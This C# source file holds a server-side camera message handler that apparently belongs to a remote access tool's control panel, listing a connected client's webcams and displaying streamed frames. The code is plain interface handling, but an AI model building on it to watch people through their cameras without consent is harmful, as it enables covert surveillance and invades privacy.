
using Server.Connectings;
using Server.Forms;
using Server.Helper;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

#nullable disable
namespace Server.Messages
{
    internal class HandlerCamera
    {
        public static void Read(Clients client, object[] objects)
        {
            switch ((string)objects[1])
            {
                case "Connect":
                    FormCamera form1 = (FormCamera)Application.OpenForms["Camera:" + (string)objects[2]];
                    if (form1 == null)
                    {
                        client.Disconnect();
                        break;
                    }
                    form1.Invoke(new MethodInvoker(() =>
                    {
                        form1.client = client;
                        form1.Text = "Camera [" + (string)objects[2] + "]";
                        string str = (string)objects[3];
                        char[] chArray = new char[1] { ',' };
                        foreach (object obj in str.Split(chArray))
                            form1.rjComboBox1.Items.Add(obj);
                        form1.rjComboBox1.SelectedIndex = 0;
                        form1.materialSwitch1.Enabled = true;
                        form1.rjComboBox1.Enabled = true;
                        form1.numericUpDown2.Enabled = true;
                    }));
                    client.Tag = (object)form1;
                    client.Hwid = (string)objects[2];
                    break;
                case "Image":
                    FormCamera form2 = (FormCamera)client.Tag;
                    if (form2 == null)
                    {
                        client.Disconnect();
                        break;
                    }
                    Bitmap bitmap = Methods.ByteArrayToBitmap((byte[])objects[2]);
                    ++form2.FPS;
                    if (form2.sw.ElapsedMilliseconds >= 1000L)
                    {
                        form2.Text = string.Format("Camera [{0}]  Fps[{1}] Data[{2}] Size[{3}x{4}]", (object)client.Hwid, (object)form2.FPS, (object)Methods.BytesToString((long)((byte[])objects[2]).Length), (object)bitmap.Width, (object)bitmap.Height);
                        form2.FPS = 0;
                        form2.sw = Stopwatch.StartNew();
                    }
                    form2.pictureBox1.Invoke(new MethodInvoker(() => form2.pictureBox1.Image = (Image)bitmap));
                    break;
            }
        }
    }
}
